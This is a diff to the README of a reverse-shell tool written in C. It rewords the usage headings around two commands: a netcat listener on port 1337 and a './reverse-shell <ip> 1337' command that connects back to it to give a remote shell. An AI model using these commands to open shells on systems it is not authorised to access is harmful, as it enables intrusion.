@@ -7,12 +7,12 @@ gcc -o reverse-shell reverse-shell.c
 ```
 
 ## Using
-**Host machine (With netcat)**
+**Bind a port on one machine to catch the shell:**
 ```
 nc -l -p 1337
 ```
 
-**Client machine:**
+**And on the other machine simply run:**
 ```
 ./reverse-shell <ip> 1337
 ```
